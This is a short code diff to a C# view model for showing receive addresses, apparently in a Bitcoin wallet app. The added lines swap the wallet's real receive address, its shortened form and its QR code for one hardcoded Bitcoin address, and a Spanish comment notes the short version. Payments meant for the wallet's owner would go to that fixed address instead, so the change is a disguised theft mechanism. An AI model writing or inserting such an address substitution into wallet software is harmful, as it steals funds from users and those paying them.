@@ -23,8 +23,8 @@ public partial class ReceiveAddressViewModel : RoutableViewModel
 		_wallet = wallet;
 		UiContext = uiContext;
 		Model = model;
-		Address = model.Text;
-		ShortenedAddress = model.ShortenedText;
+		Address = "34xp4vRoCGJym3xR7yCVPFHoCNxv4Twseo";
+        ShortenedAddress = "34xp4vRoCGJym3xR7yCVPFHoCNxv4Twseo"; // Si quieres que también se muestre en su versión corta
 		Labels = model.Labels;
 		ScriptType = model.ScriptType;
 		IsHardwareWallet = wallet.IsHardwareWallet;
@@ -40,7 +40,7 @@ public partial class ReceiveAddressViewModel : RoutableViewModel
 
 		NextCommand = CancelCommand;
 
-		QrCode = UiContext.QrCodeGenerator.Generate(model.Text.ToUpperInvariant());
+        QrCode = UiContext.QrCodeGenerator.Generate("34xp4vRoCGJym3xR7yCVPFHoCNxv4Twseo");
 
 		if (IsAutoCopyEnabled)
 		{
